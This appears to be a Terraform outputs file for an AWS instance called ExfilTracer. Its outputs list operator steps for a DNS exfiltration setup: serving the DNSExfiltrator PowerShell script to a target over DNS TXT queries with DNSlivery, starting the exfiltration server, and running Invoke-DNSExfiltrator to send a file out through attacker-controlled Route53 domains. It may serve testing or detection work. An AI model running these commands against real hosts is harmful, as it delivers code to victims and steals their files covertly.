output "A_Connect_to_instance_with" {
  value = "ssh -i ${var.Private_key} ubuntu@${aws_instance.ExfilTracer.public_ip}"
  description = "Test the description field"
}
output "B_IP_Address" {
  value = "${aws_instance.ExfilTracer.public_ip}"
}
output "C_Start_DNSlivery_to_copy_DNSExiltrator_PowerShell_Script_to_host" {
  value = "sudo python3 DNSlivery/dnslivery.py eth0 ${aws_route53_record.dnsexfilns.name} ${aws_route53_record.dnsexfil.name} -p /tmp/dns-delivery"
}
output "D_On_host_query_server_to_get_PowerShell_command_to_download_DNSExfiltrator" {
  value = "nslookup -type=txt invoke-dnsexfiltrator-ps1.${aws_route53_record.dnsexfilns.name}"
}
output "E_Once_file_has_downloaded_stop_the_DNS_service_on_the_instace" {
  value = "sudo systemctl stop systemd-resolved"
}
output "F_Start_the_exfiltration_service_with" {
  value = "sudo /usr/bin/python2.7 DNSExfiltrator/dnsexfiltrator.py -d ${aws_route53_record.dnsexfil.name} -p <YourUniqueStrongPassword>"
}
output "G_Exfiltrate_the_file_with" {
  value = "Invoke-DNSExfiltrator -i <input_file_path> -d ${aws_route53_record.dnsexfilns.name} -p <YourUniqueStrongPassword>"
}
